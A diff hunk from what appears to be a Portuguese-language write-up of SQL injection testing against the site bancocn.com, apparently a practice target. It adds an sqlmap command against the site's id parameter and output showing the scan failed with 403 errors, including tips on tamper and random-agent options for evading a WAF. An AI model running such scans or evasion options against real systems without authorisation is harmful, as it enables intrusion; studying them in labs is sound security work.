@@ -306,4 +306,15 @@ http://www.bancocn.com/cat.php?id='
 sudo apt-get install sqlmap
 ```
 
+Mesmo descobrindo que o site possui falha de escrita SQL, o `sqlmap` não conseguiu fazer uma busca pelos bancos de dados na aplicação e respondeu com o seguinte erro
+
+Comando sqlmap: `sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch`
+
+```bash
+[09:42:00] [WARNING] GET parameter 'id' does not seem to be injectable
+[09:42:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[09:42:00] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 86 times
+```
+
 
